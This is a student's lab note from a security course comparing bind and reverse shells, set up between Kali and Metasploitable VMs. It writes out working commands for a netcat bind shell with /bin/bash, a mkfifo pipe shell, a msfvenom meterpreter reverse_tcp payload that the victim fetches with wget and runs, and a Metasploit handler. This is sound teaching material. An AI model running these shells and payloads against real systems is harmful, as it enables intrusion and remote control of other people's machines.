# Bind Shell vs Reverse Shell

**Tags:** #budding #INT245 #security #netcat #shells

## Question 2 — Reverse Shell & Netcat Operations

### Bind Shell vs Reverse Shell
| Feature | Bind Shell (Q2A) | Reverse Shell (Q2B) |
|---|---|---|
| Who listens? | Victim (Metasploitable) | Attacker (Kali) |
| Who connects? | Attacker (Kali) | Victim payload |
| Port opens on | `192.168.56.102` | Kali Host-Only IP |
| Tool | `nc -lvnp` | `msfvenom` + `multi/handler` |

---

## Part A — Bind Shell with Netcat

> Victim opens port → Attacker connects to it

### Step 1 — Start Bind Shell on Metasploitable (Victim)
```bash
ssh msfadmin@192.168.56.102
# password: msfadmin
```

Inside Metasploitable:
```bash
nc -lvnp 5555 -e /bin/bash
```

If `-e` is not available:
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 5555 > /tmp/f
```

### Step 2 — Connect from Kali (Attacker)

New terminal on Kali:
```bash
nc -nv 192.168.56.102 5555
```

### Step 3 — Execute Remote Commands
```bash
whoami
id
hostname
uname -a
cat /etc/passwd
ls /home
ifconfig
```

---

## Part B — Meterpreter Reverse TCP

> Attacker listens → Victim payload calls back

### Step 1 — Generate Payload (Kali — Terminal 1)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.56.<KALI_HOSTONLY> \
  LPORT=5556 \
  -f elf \
  -o /tmp/reverse.elf

chmod +x /tmp/reverse.elf
cd /tmp && python3 -m http.server 8080
```

### Step 2 — multi/handler (Kali — Terminal 2)
```bash
msfconsole -q
```
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.<KALI_HOSTONLY>
set LPORT 5556
show options
exploit
```

### Step 3 — Run Payload on Metasploitable (Terminal 3)
```bash
ssh msfadmin@192.168.56.102

wget http://192.168.56.<KALI_HOSTONLY>:8080/reverse.elf -O /tmp/reverse.elf
chmod +x /tmp/reverse.elf
/tmp/reverse.elf
```

### Step 4 — Verify Session with Meterpreter Commands
```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > pwd
meterpreter > ls
meterpreter > ps
meterpreter > ifconfig
meterpreter > shell
```
